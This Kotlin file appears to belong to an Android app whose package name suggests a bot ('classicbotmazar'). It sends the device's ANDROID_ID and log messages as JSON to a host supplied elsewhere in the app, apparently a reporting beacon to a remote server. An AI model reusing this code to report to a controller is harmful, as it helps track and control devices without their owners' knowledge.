package org.reddeaddeath.classicbotmazar.network

import android.content.Context
import android.provider.Settings
import android.util.Base64
import android.util.Log
import org.json.JSONObject
import org.reddeaddeath.classicbotmazar.Constants

object LogManager {
    private const val TAG = "LogManager"

    fun sendLog(context: Context, typelog: String, log: String) {
        Log.d(TAG, "Sending log: typelog=$typelog")
        try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            val jsonData = createLogInfoJson(androidId, typelog, log)
            val host = HostManager.getHost(context)
            val url = "$host${Constants.API_KEY}"
            
            Log.d(TAG, "Sending log to: $url")
            val (responseCode, responseBody) = NetworkManager.sendHTTPConnection(url, jsonData)
            
            if (responseCode in 200..299) {
                Log.d(TAG, "Log sent successfully, response code: $responseCode")
            } else {
                Log.d(TAG, "Log send failed, response code: $responseCode")
            }
        } catch (e: Exception) {
            Log.d(TAG, "Error sending log: ${e.message}")
        }
    }

    private fun createLogInfoJson(androidId: String, typelog: String, log: String): JSONObject {
        val logsInfoJson = JSONObject().apply {
            put("android_id", androidId)
            put("typelog", typelog)
            put("log", log)
        }
        val jsonData = JSONObject().apply {
            put("logs-info", logsInfoJson)
        }
        Log.d(TAG, "Log JSON data prepared: typelog=$typelog")
        return jsonData
    }
}

